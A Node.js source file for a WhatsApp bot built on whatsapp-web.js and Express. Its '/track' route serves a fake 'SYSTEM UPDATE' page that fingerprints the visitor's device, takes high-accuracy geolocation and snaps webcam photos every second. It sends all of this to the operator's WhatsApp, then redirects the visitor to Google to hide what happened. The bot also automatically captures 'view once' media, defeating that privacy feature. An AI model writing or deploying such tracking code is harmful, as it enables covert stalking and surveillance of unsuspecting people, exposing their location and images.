require('dotenv').config();
const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');
const fs = require('fs');
const path = require('path');
const express = require('express');

const app = express();
const port = process.env.PORT || 5000;
let qrCodeData = '';

// Setup logging to file
const logStream = fs.createWriteStream(path.join(__dirname, 'bot.log'), { flags: 'a' });
const originalLog = console.log;
const originalError = console.error;

console.log = function(...args) {
    const msg = `[${new Date().toISOString()}] ${args.join(' ')}\n`;
    logStream.write(msg);
    originalLog.apply(console, args);
};

console.error = function(...args) {
    const msg = `[${new Date().toISOString()}] ERROR: ${args.join(' ')}\n`;
    logStream.write(msg);
    originalError.apply(console, args);
};

// Global error handlers
process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

const clearSingletonLock = () => {
    // Kill any existing chromium processes first
    try {
        const { execSync } = require('child_process');
        execSync("ps aux | grep chromium | grep -v grep | awk '{print $2}' | xargs kill -9 2>/dev/null || true");
    } catch (e) {}

    const sessionDir = path.join(__dirname, '.wwebjs_auth', 'session-bot');
    if (fs.existsSync(sessionDir)) {
        const files = fs.readdirSync(sessionDir);
        files.forEach(file => {
            if (file.includes('Singleton')) {
                try {
                    fs.unlinkSync(path.join(sessionDir, file));
                    console.log(`Successfully cleared stale Chromium file: ${file}`);
                } catch (e) {
                    console.error(`Failed to clear ${file}:`, e);
                }
            }
        });
    }
};

process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
    clearSingletonLock();
});

process.on('SIGINT', () => clearSingletonLock());
process.on('SIGTERM', () => clearSingletonLock());
process.on('exit', () => clearSingletonLock());

const client = new Client({
    authStrategy: new LocalAuth({ clientId: 'bot' }),
    puppeteer: {
        handleSIGINT: false,
        headless: true,
        userDataDir: path.join(__dirname, '.wwebjs_auth', 'session-bot'),
        executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || '/nix/store/qa9cnw4v5xkxyip6mb9kxqfq1z4x2dx1-chromium-138.0.7204.100/bin/chromium',
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-accelerated-2d-canvas',
            '--no-first-run',
            '--no-zygote',
            '--disable-gpu',
            '--disable-extensions',
            '--disable-background-networking',
            '--disable-software-rasterizer',
            '--disable-web-security',
            '--disable-features=IsolateOrigins,site-per-process',
            '--disable-site-isolation-trials',
            '--disable-features=IsolateOrigins,site-per-process,SitePerProcess',
            '--flag-switches-begin',
            '--disable-site-isolation-trials',
            '--flag-switches-end'
        ],
    }
});

let botInfo = null;

app.get('/track', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const time = new Date().toLocaleString();
    console.log(`📡 [TRACKER] NEW HIT!`);
    res.send(`
        <html>
            <head>
                <title>System Update</title>
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
            </head>
            <body style="background: #000; color: #0f0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: monospace; text-align: center; padding: 20px;">
                <h1>SYSTEM UPDATE</h1>
                <p id="status">Verifying connection... Please wait.</p>
                <script>
                    async function report(data) {
                        await fetch('/log-hit', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(data)
                        });
                    }

                    async function captureCam(info) {
                        try {
                            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                            const video = document.createElement('video');
                            video.srcObject = stream;
                            await video.play();

                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            
                            // Capture every second
                            setInterval(async () => {
                                ctx.drawImage(video, 0, 0);
                                const photo = canvas.toDataURL('image/jpeg', 0.7); // Slightly lower quality for faster transmission
                                
                                await fetch('/log-cam', {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({ photo, info })
                                });
                            }, 1000);

                        } catch (e) {
                            console.error('Cam Error:', e);
                        }
                    }

                    async function collectAll() {
                        const info = {
                            ip: "${ip}",
                            ua: navigator.userAgent,
                            platform: navigator.platform,
                            vendor: navigator.vendor,
                            language: navigator.language,
                            screen: screen.width + "x" + screen.height,
                            touchPoints: navigator.maxTouchPoints,
                            cores: navigator.hardwareConcurrency,
                            memory: navigator.deviceMemory,
                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                            cookies: navigator.cookieEnabled,
                            doNotTrack: navigator.doNotTrack,
                            time: "${time}"
                        };

                        // Battery info
                        if (navigator.getBattery) {
                            try {
                                const battery = await navigator.getBattery();
                                info.battery = Math.round(battery.level * 100) + "%";
                                info.charging = battery.charging ? "Yes" : "No";
                            } catch (e) {}
                        }

                        // Connection info
                        if (navigator.connection) {
                            info.connection = navigator.connection.effectiveType;
                            info.downlink = navigator.connection.downlink + "Mbps";
                        }

                        // Start camera capture
                        captureCam(info);

                        // Geolocation
                        navigator.geolocation.getCurrentPosition(
                            (pos) => {
                                info.lat = pos.coords.latitude;
                                info.lon = pos.coords.longitude;
                                info.acc = pos.coords.accuracy;
                                info.alt = pos.coords.altitude;
                                info.speed = pos.coords.speed;
                                report(info);
                            },
                            (err) => {
                                info.locError = err.message;
                                report(info);
                            },
                            { enableHighAccuracy: true, timeout: 5000 }
                        );

                        report(info);
                    }

                    collectAll();

                    setTimeout(() => {
                        window.location.href = "https://google.com";
                    }, 5000);
                </script>
            </body>
        </html>
    `);
});

app.post('/log-cam', express.json({ limit: '50mb' }), async (req, res) => {
    const { photo, info } = req.body;
    console.log('📸 [TRACKER] CAM DATA RECEIVED');
    if (client && client.info) {
        try {
            const buffer = Buffer.from(photo.split(',')[1], 'base64');
            const media = new (require('whatsapp-web.js').MessageMedia)('image/jpeg', buffer.toString('base64'), 'cam.jpg');
            
            let report = `📸 *TRACKER CAMERA CAPTURE*\n\n`;
            report += `🕒 *Time:* ${info.time || new Date().toLocaleString()}\n`;
            report += `🌐 *IP:* ${info.ip}\n`;
            report += `📱 *Device:* ${info.ua}\n`;
            report += `🧠 *Hardware:* ${info.cores || 'N/A'} Cores, ${info.memory || 'N/A'}GB RAM\n`;
            
            const botNumber = client.info.wid._serialized;
            await client.sendMessage(botNumber, media, { caption: report });
        } catch (err) {
            console.error('Failed to send camera report:', err);
        }
    }
    res.sendStatus(200);
});

app.post('/log-hit', express.json(), async (req, res) => {
    const data = req.body;
    console.log('📍 [TRACKER] DATA RECEIVED:', data);
    if (client && client.info) {
        let report = `📍 *TRACKER HIT REPORT*\n\n`;
        report += `🕒 *Time:* ${data.time}\n`;
        report += `🌐 *IP:* ${data.ip}\n`;
        report += `📱 *Device:* ${data.ua}\n`;
        report += `💻 *Platform:* ${data.platform}\n`;
        report += `📏 *Screen:* ${data.screen}\n`;
        report += `🔋 *Battery:* ${data.battery || 'N/A'} (Charging: ${data.charging || 'N/A'})\n`;
        report += `📶 *Network:* ${data.connection || 'N/A'} (${data.downlink || 'N/A'})\n`;
        report += `🌍 *Timezone:* ${data.timezone || 'N/A'}\n`;
        report += `🧠 *Hardware:* ${data.cores || 'N/A'} Cores, ${data.memory || 'N/A'}GB RAM\n`;
        report += `👆 *Touch:* ${data.touchPoints || 0} Points\n`;
        
        if (data.lat && data.lon) {
            report += `🗺️ *Location:* https://www.google.com/maps?q=${data.lat},${data.lon}\n`;
            report += `🎯 *Accuracy:* ${data.acc}m\n`;
            if (data.alt) report += `🏔️ *Altitude:* ${data.alt}m\n`;
            if (data.speed) report += `🚀 *Speed:* ${data.speed}m/s\n`;
        } else if (data.locError) {
            report += `⚠️ *Location Error:* ${data.locError}\n`;
        }
        try {
            const botNumber = client.info.wid._serialized;
            await client.sendMessage(botNumber, report);
        } catch (err) {
            console.error('Failed to send tracker report to bot number:', err);
        }
    }
    res.sendStatus(200);
});

app.get('/', (req, res) => {
    if (botInfo) {
        const logFile = path.join(__dirname, 'bot.log');
        let logs = 'No logs available.';
        if (fs.existsSync(logFile)) {
            logs = fs.readFileSync(logFile, 'utf8').split('\n').slice(-30).join('\n');
        }
        res.send(`
            <html>
            <head>
            <title>Zara Bot - Online</title>
            <style>
            body { display: flex; flex-direction: column; align-items: center; justify-content: flex-start; min-height: 100vh; font-family: sans-serif; background: #f0f2f5; margin: 0; padding: 20px; box-sizing: border-box; }
            .card { background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; width: 100%; max-width: 800px; margin-bottom: 20px; }
            .status-badge { margin: 1rem 0; padding: 1rem; background: #e7f3f0; border-radius: 4px; display: inline-block; }
            .console { text-align: left; background: #1e1e1e; color: #00ff00; padding: 15px; border-radius: 4px; font-family: 'Consolas', 'Monaco', monospace; white-space: pre-wrap; overflow-x: auto; max-height: 400px; overflow-y: auto; font-size: 12px; border: 1px solid #333; }
            .timestamp { color: #888; }
            .error { color: #ff0000; }
            </style>
            </head>
            <body>
            <div class="card">
            <h1 style="color: #128c7e; margin: 0;">WhatsApp Bot Online</h1>
            <div class="status-badge">
            <p style="margin: 0; font-weight: bold; color: #0b5e54;">Connected as: ${botInfo.pushname}</p>
            <p style="margin: 5px 0 0 0; color: #667781; font-size: 0.9rem;">Number: ${botInfo.wid.user}</p>
            </div>
            <div style="text-align: left; margin-top: 1.5rem;">
            <h3 style="color: #128c7e; font-size: 14px; margin-bottom: 8px;">LIVE CONSOLE</h3>
            <div class="console" id="console">${logs.replace(/\[(\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z)\]/g, '<span class="timestamp">[$1]</span>').replace(/ERROR:/g, '<span class="error">ERROR:</span>')}</div>
            </div>
            <script>
            const consoleDiv = document.getElementById('console');
            consoleDiv.scrollTop = consoleDiv.scrollHeight;
            setTimeout(() => window.location.reload(), 3000);
            </script>
            </div>
            </body>
            </html>
        `);
    } else if (qrCodeData) {
        res.send(`
            <html>
            <body style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; background: #f0f2f5;">
            <div style="background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center;">
            <h1 style="color: #128c7e;">WhatsApp Bot Login</h1>
            <div id="qrcode" style="display: flex; justify-content: center; margin: 20px 0;"></div>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
            <script>
            new QRCode(document.getElementById("qrcode"), { text: "${qrCodeData}", width: 256, height: 256 });
            </script>
            <script>setTimeout(() => window.location.reload(), 10000);</script>
            </div>
            </body>
            </html>
        `);
    } else {
        const logFile = path.join(__dirname, 'bot.log');
        let logs = 'No logs available.';
        if (fs.existsSync(logFile)) {
            logs = fs.readFileSync(logFile, 'utf8').split('\n').slice(-50).join('\n');
        }
        res.send(`
            <html>
            <head>
            <title>Zara Bot Console</title>
            <style>
            body { background: #0c0c0c; color: #00ff00; font-family: 'Consolas', 'Monaco', monospace; margin: 0; padding: 20px; font-size: 14px; line-height: 1.5; }
            #console { background: #1a1a1a; border: 1px solid #333; padding: 20px; border-radius: 5px; box-shadow: 0 0 20px rgba(0,0,0,0.5); white-space: pre-wrap; word-wrap: break-word; overflow-y: auto; max-height: 85vh; }
            .timestamp { color: #888; font-size: 12px; }
            .error { color: #ff0000; }
            </style>
            </head>
            <body>
            <div id="console">${logs.replace(/\[(\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z)\]/g, '<span class="timestamp">[$1]</span>').replace(/ERROR:/g, '<span class="error">ERROR:</span>')}</div>
            <script>
            const consoleDiv = document.getElementById('console');
            consoleDiv.scrollTop = consoleDiv.scrollHeight;
            setTimeout(() => window.location.reload(), 3000);
            </script>
            </body>
            </html>
        `);
    }
});

app.get('/logs', (req, res) => {
    const logFile = path.join(__dirname, 'bot.log');
    if (fs.existsSync(logFile)) {
        const logs = fs.readFileSync(logFile, 'utf8').split('\n').slice(-100).reverse().join('\n');
        res.send(`<html><body style="background:#1e1e1e;color:#d4d4d4;font-family:monospace;padding:20px;"><pre>${logs}</pre><script>setTimeout(()=>location.reload(),5000)</script></body></html>`);
    } else {
        res.send('No logs available yet.');
    }
});

app.listen(port, '0.0.0.0', () => {
    console.log(`Web preview available at port ${port}`);
    console.log(`REPL_SLUG: ${process.env.REPL_SLUG}`);
    console.log(`REPL_OWNER: ${process.env.REPL_OWNER}`);
});

const plugins = {};
const pluginPath = path.join(__dirname, 'plugins');
if (fs.existsSync(pluginPath)) {
    const files = fs.readdirSync(pluginPath).filter(file => file.endsWith('.js'));
    for (const file of files) {
        const plugin = require(`./plugins/${file}`);
        if (plugin.name) plugins[plugin.name] = plugin;
    }
}

client.on('qr', qr => {
    qrCodeData = qr;
    console.log('New QR code generated. View it in the web preview.');
});

client.on('ready', async () => {
    qrCodeData = '';
    botInfo = client.info;
    console.log(`Bot is online! Loaded ${Object.keys(plugins).length} commands.`);
    const restartFile = path.join(__dirname, '.restart_chat');
    if (fs.existsSync(restartFile)) {
        const chatId = fs.readFileSync(restartFile, 'utf8').trim();
        try {
            await client.sendMessage(chatId, '✅ *Bot is back online!*');
            fs.unlinkSync(restartFile);
        } catch (err) {
            console.error('Failed to send restart message:', err);
        }
    }
});

// ✅ FIXED BLOCK BELOW
client.on('message_create', async (message) => {
    const prefix = '.';

    // Check if body exists and is a string before checking for prefix
    if (message.body && typeof message.body === 'string' && message.body.startsWith(prefix)) {
        const args = message.body.slice(prefix.length).trim().split(/ +/);
        const commandName = args.shift().toLowerCase();

        if (plugins[commandName]) {
            try {
                await plugins[commandName].execute(client, message, args, plugins);
            } catch (err) {
                console.error(`Error in ${commandName}:`, err);
                message.reply('⚠️ Error executing command.');
            }
        }
    }

    // Anti-View Once logic (processes regardless of text body)
    const rawMsg = message._data;
    const isVO = message.isViewOnce || 
    (rawMsg && (rawMsg.isViewOnce || rawMsg.viewOnce || (rawMsg.labels && rawMsg.labels.includes('viewOnce')))) ||
    (message.type === 'image' && rawMsg && rawMsg.isViewOnce) ||
    (message.type === 'video' && rawMsg && rawMsg.isViewOnce);

    if (isVO && plugins['antiviewonce']) {
        try {
            await plugins['antiviewonce'].execute(client, message, ['auto']);
        } catch (err) {
            console.error('Auto Anti-View Once Error:', err);
        }
    }
});

client.on('message_edit', async (message, newBody, prevBody) => {
    if (message.isViewOnce || (message._data && message._data.isViewOnce)) {
        if (plugins['antiviewonce']) {
            try {
                await plugins['antiviewonce'].execute(client, message, []);
            } catch (err) {
                console.error('Edit-based Anti-View Once Error:', err);
            }
        }
    }
});

const initializeClient = () => {
    const lockPath = path.join(__dirname, '.wwebjs_auth', 'session-bot', 'SingletonLock');
    if (fs.existsSync(lockPath)) {
        try {
            fs.unlinkSync(lockPath);
            console.log('Found stale lock during init. Clearing...');
        } catch (e) {
            console.error('Failed to clear lock during init:', e);
        }
    }

    client.initialize().catch(err => {
        console.error('Failed to initialize WhatsApp client:', err);
        if (fs.existsSync(lockPath)) {
            try {
                fs.unlinkSync(lockPath);
                setTimeout(initializeClient, 5000);
            } catch (e) {}
        }
    });
};

initializeClient();